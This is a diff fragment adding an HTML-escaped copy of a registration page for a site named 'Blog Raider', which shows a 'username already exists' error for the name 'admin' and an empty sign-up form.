+    &lt;title&gt;Register&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot;  &gt;Blog Raider&lt;/a&gt;
+        &lt;div class=&quot;collapse navbar-collapse&quot;&gt;
+            &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+                
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/register&quot;&gt;Register&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/login&quot;&gt;Login&lt;/a&gt;
+                    &lt;/li&gt;
+                
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        
+            
+                
+                    &lt;div class=&quot;alert alert-danger&quot;&gt;Username already exists. Please choose a different one.&lt;/div&gt;
+                
+            
+        
+        
+    &lt;h2&gt;Register&lt;/h2&gt;
+    &lt;form method=&quot;POST&quot; action=&quot;/register&quot;&gt;
+        
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label class=&quot;form-control-label&quot; for=&quot;username&quot;&gt;Username&lt;/label&gt;
+            &lt;input class=&quot;form-control form-control-lg&quot; id=&quot;username&quot; maxlength=&quot;20&quot; minlength=&quot;2&quot; name=&quot;username&quot; required type=&quot;text&quot; value=&quot;admin&quot;&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label class=&quot;form-control-label&quot; for=&quot;password&quot;&gt;Password&lt;/label&gt;
+            &lt;input class=&quot;form-control form-control-lg&quot; id=&quot;password&quot; name=&quot;password&quot; required type=&quot;password&quot; value=&quot;&quot;&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label class=&quot;form-control-label&quot; for=&quot;confirm_password&quot;&gt;Confirm Password&lt;/label&gt;
+            &lt;input class=&quot;form-control form-control-lg&quot; id=&quot;confirm_password&quot; name=&quot;confirm_password&quot; required type=&quot;password&quot; value=&quot;&quot;&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;input class=&quot;btn btn-primary btn-lg btn-block&quot; id=&quot;submit&quot; name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Sign Up&quot;&gt;
+        &lt;/div&gt;
+    &lt;/form&gt;
+
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+</body></html>
